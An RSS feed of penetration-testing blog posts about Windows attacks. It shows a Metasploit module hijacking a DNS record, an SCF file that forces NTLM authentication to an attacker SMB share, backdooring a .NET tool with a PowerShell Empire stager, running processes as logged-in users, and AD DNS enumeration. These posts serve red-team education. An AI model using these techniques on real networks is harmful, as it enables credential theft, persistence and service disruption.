<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>windows on malicious.link</title>
    <link>https://malicious.link/tags/windows/</link>
    <description>Recent content in windows on malicious.link</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sun, 25 Jun 2017 07:35:28 -0500</lastBuildDate>
    
        <atom:link href="https://malicious.link/tags/windows/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Dynamic DNS Update Module</title>
      <link>https://malicious.link/post/2017/dynamic-dns-update-module/</link>
      <pubDate>Sun, 25 Jun 2017 07:35:28 -0500</pubDate>
      
      <guid>https://malicious.link/post/2017/dynamic-dns-update-module/</guid>
      <description>&lt;p&gt;&amp;ldquo;Secure&amp;rdquo; DNS updates is the default in Windows, but there is an option to allow &amp;ldquo;Nonsecure&amp;rdquo; updates. I have seen this changed when non-Windows DHCP servers are used (eg Access Points), this opens a network up to some pretty nifty attacks that a Metasploit module just hit the ground for.&lt;/p&gt;
&lt;center&gt;![](/images/2017/nonsecure_dns_updates.png)&lt;/center&gt;
&lt;p&gt;The module was originally written by &lt;a href=&#34;https://twitter.com/kingsabri&#34;&gt;King Sabri&lt;/a&gt;, with many touch ups and the spoofing capability by &lt;a href=&#34;https://twitter.com/busterbcook&#34;&gt;busterbcook&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;You can read up on the pull request in &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/pull/8599&#34;&gt;pr/#8599&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Just to drive home the point I&amp;rsquo;ll be using my Exchange server as a target:&lt;/p&gt;
&lt;center&gt; **You will break email for the entire company if you do this on a live network. Doing so is possibly a resume generating event.**&lt;/center&gt;
&lt;center&gt;![](/images/2017/before_dns_update.png)&lt;/center&gt;
&lt;p&gt;If you are going to be overwriting an existing record make sure to keep a note of the real IP address of the host you are overwriting so that you can fix the record afterwards.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ dig @192.168.80.10 sdexchange.sittingduck.info

;; ANSWER SECTION:
sdexchange.sittingduck.info. 1200 IN	A	192.168.80.13
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here is what the module looks like:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;msf &amp;gt; use auxiliary/admin/dns/dyn_dns_update
msf auxiliary(dyn_dns_update) &amp;gt; show options

Module options (auxiliary/admin/dns/dyn_dns_update):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   CHOST                      no        The source address to use for queries and updates
   DOMAIN                     yes       The domain name
   HOSTNAME                   yes       The name record you want to add
   IP                         no        The IP you want to assign to the record
   RHOST                      yes       The vulnerable DNS server IP address
   TYPE      A                yes       The record type you want to add. (Accepted: A, AAAA, CNAME, TXT)
   VALUE                      no        The string to be added with TXT or CNAME record


Auxiliary action:

   Name    Description
   ----    -----------
   UPDATE  Add or update a record. (default)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It has 3 different actions, but you&amp;rsquo;ll mostly want &lt;code&gt;UPDATE&lt;/code&gt;. &lt;code&gt;UPDATE&lt;/code&gt; will automatically delete a record if it exists already and then add the record back with your specified settings.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;msf auxiliary(dyn_dns_update) &amp;gt; show actions

Auxiliary actions:

   Name    Description
   ----    -----------
   ADD     Add a new record. Fail if it already exists.
   DELETE  Delete an existing record.
   UPDATE  Add or update a record. (default)

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here are the settings I chose. Notice the IP address that I&amp;rsquo;m injecting isn&amp;rsquo;t on the same subnet as the domain.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;msf auxiliary(dyn_dns_update) &amp;gt; set DOMAIN sittingduck.info
DOMAIN =&amp;gt; sittingduck.info
msf auxiliary(dyn_dns_update) &amp;gt; set HOSTNAME sdexchange
HOSTNAME =&amp;gt; sdexchange
msf auxiliary(dyn_dns_update) &amp;gt; set IP 100.100.100.100
IP =&amp;gt; 100.100.100.100
msf auxiliary(dyn_dns_update) &amp;gt; set RHOST 192.168.80.10
RHOST =&amp;gt; 192.168.80.10
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And the output:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;msf auxiliary(dyn_dns_update) &amp;gt; run

[+] Found existing A record for sdexchange.sittingduck.info
[*] Sending dynamic DNS delete message...
[+] The record &#39;sdexchange.sittingduck.info =&amp;gt; 100.100.100.100&#39; has been deleted!
[*] Sending dynamic DNS add message...
[+] The record &#39;sdexchange.sittingduck.info =&amp;gt; 100.100.100.100&#39; has been added!
[*] Auxiliary module execution completed
msf auxiliary(dyn_dns_update) &amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;game-over&#34;&gt;#Game Over&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2017/after_dns_update.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;This will stay until fixed or another dynamic DNS update is performed from the original server (every 24 hours or so).&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Passwordreq No - A hacker prospective</title>
      <link>https://malicious.link/post/2016/passwordreq-no-a-hacker-prospective/</link>
      <pubDate>Wed, 07 Dec 2016 07:35:28 -0500</pubDate>
      
      <guid>https://malicious.link/post/2016/passwordreq-no-a-hacker-prospective/</guid>
      <description>&lt;p&gt;Ever have one of those topics that you know you&amp;rsquo;ve looked up 100 times but never can remember the answer?&lt;/p&gt;
&lt;p&gt;I was having one of those moments in a recent conversation on the NoVA Hackers mailing list (If you want to join &lt;a href=&#34;https://novahackers.blogspot.com/p/how-to-join-and-rules.html&#34;&gt;please read the instructions&lt;/a&gt; before &lt;a href=&#34;https://twitter.com/mubix/status/719726427785007104&#34;&gt;requesting to join&lt;/a&gt;)&lt;/p&gt;
&lt;p&gt;The question came up as to what effect &amp;ldquo;Password Required: No&amp;rdquo; means in a &lt;code&gt;net user UserName&lt;/code&gt; is.&lt;/p&gt;
&lt;p&gt;As usual, MSDN isn&amp;rsquo;t very helpful:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/passwordreq:{yes | no} - Specifies whether a user account must have a password. The default is yes.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;from: &lt;a href=&#34;https://technet.microsoft.com/en-us/library/cc771865%28v=ws.11%29.aspx&#34;&gt;https://technet.microsoft.com/en-us/library/cc771865%28v=ws.11%29.aspx&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;An old ISS finding wasn&amp;rsquo;t any more helpful:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;A User account has been detected with no password required. No password requirement allows attackers unauthorized access, including the ability to take over and replace processes, and access other computers on the network.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;from: &lt;a href=&#34;http://www.iss.net/security_center/reference/vulntemp/nt-usernopw.htm&#34;&gt;http://www.iss.net/security_center/reference/vulntemp/nt-usernopw.htm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;But they did at least provide mitigations and remediation steps.&lt;/p&gt;
&lt;p&gt;Finally doing tests on a number of different scenarios I finally figured out what it meant in more concret terms:&lt;/p&gt;
&lt;p&gt;If the &lt;code&gt;passwordreq&lt;/code&gt; field is set on an account, the password &lt;strong&gt;CAN&lt;/strong&gt; be blank which essentially bypasses any password complexity requirements:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2016/passwordreq.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;In one specific case this actually makes things more secure:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2016/passwordreq2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;CIFS/SMB does not allow access to shares or IFS actions by default as per default computer/group policy. However, RDP, WinRM, and WMI work just fine.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>SMB/HTTP Auth Capture via SCF File</title>
      <link>https://malicious.link/post/2016/smb-http-auth-capture-via-scf/</link>
      <pubDate>Tue, 14 Jun 2016 07:35:28 -0500</pubDate>
      
      <guid>https://malicious.link/post/2016/smb-http-auth-capture-via-scf/</guid>
      <description>&lt;p&gt;Recently saw a link to an SCF file. Didn&amp;rsquo;t know what those were
so I went digging. Turns out they are a simple text based file that
controls Windows Explorer. ;-)&lt;/p&gt;
&lt;p&gt;Here are the examples I found via the references:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Open Explorer&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[Shell] 
Command = 2 
IconFile = explorer.exe, 1
[Taskbar] 
Command = Explorer
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Open &amp;ldquo;Channels&amp;rdquo; page in IE:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[Shell]
Command=3
IconFile=shdocvw.dll,-118
[IE]
Command=Channels
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This didn&amp;rsquo;t work for me at all, probably because Internet Explorer doesn&amp;rsquo;t have &amp;ldquo;Channels&amp;rdquo; anymore.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Minimize all windows:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[Shell]
Command=2
IconFile=explorer.exe,3
[Taskbar]
Command=ToggleDesktop
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;My first attempt to utilize this file format for fun was of course
to just set the IconFile to an SMB share:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[Shell]
Command=2
IconFile=\\192.168.1.101\share\test.ico
[Taskbar]
Command=ToggleDesktop
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;and that worked as expected, every time the share was opened, whoever
opened that folder it automatically attempted to authenticate to the
share that I specified. Lots easier than writing an LNK file.&lt;/p&gt;
&lt;p&gt;My gut is telling me there is more to this file format than meets the
eye, especially when there are malware writers using it as well. I
haven&amp;rsquo;t been able to get my hands on one to see what they are doing
inside the file, but I assume it&amp;rsquo;s not just to minimize all windows.&lt;/p&gt;
&lt;p&gt;There are some hints that you can invoke COM objects.. who knows&amp;hellip;&lt;/p&gt;
&lt;h2 id=&#34;references&#34;&gt;References:&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://git.reactos.org/?p=reactos.git;a=commitdiff;h=f655c2aca94bcbd04677c9a1c874740f1f9adbd7&#34;&gt;https://git.reactos.org/?p=reactos.git;a=commitdiff;h=f655c2aca94bcbd04677c9a1c874740f1f9adbd7&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.blitzmax.com/Community/posts.php?topic=76323&#34;&gt;http://www.blitzmax.com/Community/posts.php?topic=76323&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://web.archive.org/web/20090122115553/http://shellrevealed.com/forums/thread/7604.aspx&#34;&gt;https://web.archive.org/web/20090122115553/http://shellrevealed.com/forums/thread/7604.aspx&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.programmershare.com/2403039/&#34;&gt;http://www.programmershare.com/2403039/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>DotNet&#39;s DNVM For Persistence On Developer Machines</title>
      <link>https://malicious.link/post/2015/dotnet-dnvm-for-persistence-on-developer-machines/</link>
      <pubDate>Mon, 05 Oct 2015 07:35:28 -0500</pubDate>
      
      <guid>https://malicious.link/post/2015/dotnet-dnvm-for-persistence-on-developer-machines/</guid>
      <description>&lt;p&gt;One of the best resources for persistence mechanisms is &lt;a href=&#34;https://twitter.com/Hexacorn&#34;&gt;Hexacorn&amp;rsquo;s&lt;/a&gt; blog.
&lt;a href=&#34;http://www.hexacorn.com/blog/category/autostart-persistence/&#34;&gt;http://www.hexacorn.com/blog/category/autostart-persistence/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;If you haven&amp;rsquo;t checked out his &amp;ldquo;Beyond good ol&amp;rsquo; Run key&amp;rdquo; (linked above) 32 post series, you really should. But today I wanted to talk about one that I didn&amp;rsquo;t see up there:&lt;/p&gt;
&lt;p&gt;DNVM (&lt;a href=&#34;https://github.com/aspnet/dnvm&#34;&gt;https://github.com/aspnet/dnvm&lt;/a&gt;) is the DotNet Version Manager and it&amp;rsquo;s a part of ASP.NET 5, which I believe has been inside of Visual Studio since the 2013 version. It&amp;rsquo;s there to help to specify which runtime to use for applications, much like &lt;a href=&#34;https://rvm.io/&#34;&gt;RVM (Ruby Version Manager)&lt;/a&gt; is for Ruby. With their goal being that you can install .Net and &lt;a href=&#34;http://docs.asp.net/en/latest/getting-started/index.html&#34;&gt;run .Net applications on Linux and Mac&lt;/a&gt; as well using DNVM.&lt;/p&gt;
&lt;p&gt;Once installed it adds a &amp;ldquo;DNX_HOME&amp;rdquo; environmental variable:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2015/dnx_reg.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Inside the folder specified are 3 directories:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2015/dnx_folder.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;There are plenty of things to play with in here, but I wanted to specifically point out that the &lt;strong&gt;BIN&lt;/strong&gt; directory is put into the $PATH variable (as well as two others)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\WINDOWS\system32\config\systemprofile\.dnx\bin (DOES NOT EXIST BY DEFAULT)
C:\Program Files\Microsoft DNX\Dnvm\
C:\Users\mubix\.dnx\bin
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ok, not a big deal right? Even a user under UAC can edit their own $PATH variable (we&amp;rsquo;ll come back to that in another post)&lt;/p&gt;
&lt;p&gt;Lets take a look at what is in those folders:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2015/dnvm_folders.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Interesting, why don&amp;rsquo;t we see what the command dnvm does:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2015/dnvm_cmd.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Seriously&amp;hellip; I probably don&amp;rsquo;t even have to continue at this point&amp;hellip;&lt;/p&gt;
&lt;p&gt;But, if I run dnvm from the command prompt (as a developer would) it runs it from inside that protected directory in Program Files right?&amp;hellip; RIGHT?! Nope..&lt;/p&gt;
&lt;p&gt;Edit the dnvm.cmd with a bit of &lt;a href=&#34;http://www.powershellempire.com/&#34;&gt;PowerShell Empire&lt;/a&gt; stager (minus the &lt;strong&gt;-W Hidden&lt;/strong&gt;, because we need the user to actually get the output of the dnvm command) and&amp;hellip;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[+] Initial agent UU2YKZ3VDG2AUKFY from 192.168.1.109 now active
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Boom!&lt;/p&gt;
&lt;p&gt;Lets look a bit into how DNVM works to see if there is something juicier there (way to much for a single blog post)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2015/dnvm_list.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Awesome! So I can modify things in the runtime directory, lets look in there:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2015/dnvm_runtime.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Lots, of fun, but we still have to wait until they run some C# code with that run time and guess which one they will use (or backdoor all of them). I would rather just make a modification to the dnvm.cmd and be done with it. Simple and clean.&lt;/p&gt;
&lt;p&gt;Oh did I mention that this is used to cross compile binaries? Ya, oh ok, so you can infect the built binaries, or web apps for Windows, Linux and OSX&amp;hellip;&lt;/p&gt;
&lt;p&gt;Oh and one other thing caught my eye while I was looking into the DNVM.ps1 script:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2015/dnvm_azure.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Have fun!&lt;/p&gt;
&lt;p&gt;P.S. Unquoted paths FTW: &lt;a href=&#34;https://github.com/aspnet/dnvm/pull/357&#34;&gt;https://github.com/aspnet/dnvm/pull/357&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Milkman: Creating processes as any currently logged in user</title>
      <link>https://malicious.link/post/2014/milkman-creating-processes-as-any-currently-logged-in-user/</link>
      <pubDate>Thu, 14 Aug 2014 11:26:38 -0500</pubDate>
      
      <guid>https://malicious.link/post/2014/milkman-creating-processes-as-any-currently-logged-in-user/</guid>
      <description>&lt;p&gt;One of the problems with using PSEXEC from Metasploit (any of the psexec modules) is that it runs as &lt;strong&gt;SYSTEM&lt;/strong&gt;. What&amp;rsquo;s the problem with that? Isn&amp;rsquo;t &lt;strong&gt;SYSTEM&lt;/strong&gt; god mode? Ya, and normally I&amp;rsquo;d agree that it&amp;rsquo;s the best level to have, but the defenses these days have gotten better, and getting direct connections out is pretty rare. That leaves proxies, and as you know &lt;strong&gt;SYSTEM&lt;/strong&gt; doesn&amp;rsquo;t get any proxy settings.&lt;/p&gt;
&lt;p&gt;Here is a blog post that I made &lt;a href=&#34;https://malicious.link/blog/2012/10/21/setting-systems-proxy-settings-with-metasploit/&#34;&gt;about setting the proxies for SYSTEM&lt;/a&gt; but leaving settings like this set is not only sloppy but hard to clean up.&lt;/p&gt;
&lt;p&gt;Along comes &lt;code&gt;RunAsCurrentUser-2.0.3.1.exe&lt;/code&gt; I found this gem by messing up a search on google for RunAsUser. Found it &lt;a href=&#34;https://www-304.ibm.com/support/docview.wss?uid=swg21506033&#34;&gt;on this IBM support post&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2014/201408_ibm_runascurrentuser.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Link to direct download: &lt;a href=&#34;http://software.bigfix.com/download/bes/util/RunAsCurrentUser-2.0.3.1.exe&#34;&gt;http://software.bigfix.com/download/bes/util/RunAsCurrentUser-2.0.3.1.exe&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Here is a mirror uploaded to my Post Exploitation repo: &lt;a href=&#34;https://github.com/mubix/post-exploitation/blob/master/win32bins/RunAsCurrentUser-2.0.3.1.exe&#34;&gt;https://github.com/mubix/post-exploitation/blob/master/win32bins/RunAsCurrentUser-2.0.3.1.exe&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This binary takes a path to another executable as an argument. It then finds the currently logged in user and starts the provided executable as that user. AWESOME! This basically solves the whole  PSEXEC-&amp;gt;SYSTEM no-proxy settings issue. And it&amp;rsquo;s created by a legitimate company for legitimate reasons? w00tw00t. Game on!&lt;/p&gt;
&lt;p&gt;Only two problems:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;It is 335K, which doesn&amp;rsquo;t seem like much but over high latency lines that can take an eternity to transfer, especially over doubly encrypted channels like with a reverse_https meterpreter session.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;It takes an argument which normally isn&amp;rsquo;t a huge challenge, but in our specific use case, psexec modules in Metasploit, it isn&amp;rsquo;t something we can do easily. You would have to upload your C2 binary, as well as the 335K RunAsCurrentUser over to the target host, then run the psexec_command module to execute them both, one as the argument of the other. Kinda sloppy.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;So I set to try and figure out how this binary did it&amp;rsquo;s magic. As I&amp;rsquo;m not much of a reverse engineer I &lt;a href=&#34;https://www.virustotal.com/en/file/1a9b518c775e2a85a7c47801e9b8221df338a65ad8df326485e4cd2aea22fe52/analysis/&#34;&gt;uploaded it to VirusTotal&lt;/a&gt; so I could take a look at it&amp;rsquo;s insides (plus, double check to see if it was being detected as malicious at all).&lt;/p&gt;
&lt;p&gt;As far as I can tell the important pieces are the Windows API calls &lt;strong&gt;ImpersonateLoggedOnUser&lt;/strong&gt;, and &lt;strong&gt;CreateProcessAsUserA&lt;/strong&gt;. I set to trying to reproduce what it did in &lt;a href=&#34;https://www.autoitscript.com/site/autoit/&#34;&gt;AutoIT (awesome stuff if you have never checked it out)&lt;/a&gt;. I couldn&amp;rsquo;t quite get the API calls right, so I decided to give C++ a shot. Turned out to be pretty simple. I present to you &amp;ldquo;Milkman&amp;rdquo;:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://gist.github.com/mubix/5d0cacdabfe092922fa3&#34;&gt;https://gist.github.com/mubix/5d0cacdabfe092922fa3&lt;/a&gt;  &lt;strong&gt;(full source included below)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This program (once compiled) takes one argument (or none at all) and runs calc.exe for every instance of the process you tell it to. If you run it without arguments it auto selects explorer.exe. So if you create a service:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\temp\&amp;gt;sc create SuperService binpath= C:\Temp\milkman.exe type= own start= auto
[SC] CreateService SUCCESS
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It will start up every time the computer starts, which is completely useless, since there won&amp;rsquo;t be any users logged in at that point, but you get where this can go. Features to add to this at point are:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Create a service binary that responds to START/STOP/PAUSE commands and such so that running this as a persistence method would actually be useful.&lt;/li&gt;
&lt;li&gt;Add a loop so that it continues to run checking for explorer.exe every so often so it can catch when someone is logged in.&lt;/li&gt;
&lt;li&gt;Finally the obvious one is to change it from being calc.exe that it runs by accepting another argument or some other kind of config option.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Thoughts? What would you like Milkman to do, or what use case do you think a tweak would make it work better for? Leave a comment below.&lt;/p&gt;
&lt;script src=&#34;https://gist.github.com/mubix/5d0cacdabfe092922fa3.js&#34;&gt;&lt;/script&gt;
</description>
    </item>
    
    <item>
      <title>AD Zone Transfers as a user</title>
      <link>https://malicious.link/post/2013/ad-zone-transfers-as-a-user/</link>
      <pubDate>Fri, 04 Oct 2013 11:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2013/ad-zone-transfers-as-a-user/</guid>
      <description>&lt;p&gt;_cross posted from: &lt;a href=&#34;http://carnal0wnage.attackresearch.com/2013/10/ad-zone-transfers-as-user.html_&#34;&gt;http://carnal0wnage.attackresearch.com/2013/10/ad-zone-transfers-as-user.html_&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The tired and true method for Zone Transfers are using either nslookup:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nslookup
ls -d domain.com.local
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Or dig:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;dig -t AXFR domain.com.local @ns1.domain.com.local
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the Windows Enterprise world there are a few more options. If you are a DNS Admin you can use the &amp;lsquo;dnscmd&amp;rsquo; command like so:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;dnscmd /EnumZones
dnscmd /ZonePrint domain.com.local
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Which is handy if you can pop the DNS server (usually the Domain Controller so you usually have better things to do at that point).&lt;/p&gt;
&lt;p&gt;You can also use PowerShell:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;PS C:\Users\jdoe&amp;gt; get-wmiobject -ComputerName dc1 -Namespace root\microsoftDNS -Class MicrosoftDNS_ResourceRecord -Filter &amp;quot;domainname=&#39;projectmentor.net&#39;&amp;quot; | select textrepresentation&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Again, this requires you to be a very high privileged account, which is no fun. I need these computer lists as part of my internal / post-exploitation recon, not an end step.&lt;/p&gt;
&lt;p&gt;For the longest time I relied on a very awesome tool called &amp;ldquo;Adfind&amp;rdquo;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;adfind -sc computers_active -csv -nodn -nocsvq -nocsvheader
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This command will output a list of computer accounts that have been active in the last 90 days in a straight line by line format (hence all of the no &amp;ldquo;this&amp;quot;and no &amp;ldquo;that&amp;rdquo; flags)&lt;/p&gt;
&lt;p&gt;But that wasn&amp;rsquo;t good enough, this image kept haunting me:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2013/ad-dns-zone.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;It&amp;rsquo;s Active Directory Explorer by SysInternals. It shows the complete list of DNS records, stored as objects in Active Directory that I was able to get to as a basic domain user. This means all of the static DNS records for the unix systems and mainframes and other systems outside of the purely Windows world are there as well.&lt;/p&gt;
&lt;p&gt;I spent 4 days attempting to write my own script, ldap query, prayer to  get all of the data out but was unsuccessful. On the 5th day I happened upon a very short post saying &amp;ldquo;I did it&amp;rdquo;, as I probably would have written the same. It comes in the form of a PowerShell script that you can find here:&lt;/p&gt;
&lt;p&gt;Code: &lt;a href=&#34;https://github.com/mmessano/PowerShell/blob/master/dns-dump.ps1&#34;&gt;https://github.com/mmessano/PowerShell/blob/master/dns-dump.ps1&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;And is very easy to run:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;PS C:\Users\jdoe&amp;gt; dns-dump.ps1 -zone projectmentor.net -dc dc1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;or&lt;/p&gt;
&lt;p&gt;&lt;code&gt;C:\&amp;gt; powershell -ep bypass -f dnsdump.ps1 -zone projectmentor.net -dc dc1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;If you put a -csv on the end of those the author has even given you the CSV format which makes the output extremely easy to parse. Now you can throw your list into your tool of choice instead of scanning random IP ranges on the targets network for important stuff you can scan directly against known good hosts.&lt;/p&gt;
&lt;p&gt;&amp;ndash; mubix&lt;/p&gt;
&lt;p&gt;P.S. Yes I realize this isn&amp;rsquo;t actually &amp;ldquo;Zone Transfer&amp;quot;s but its close enough&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>
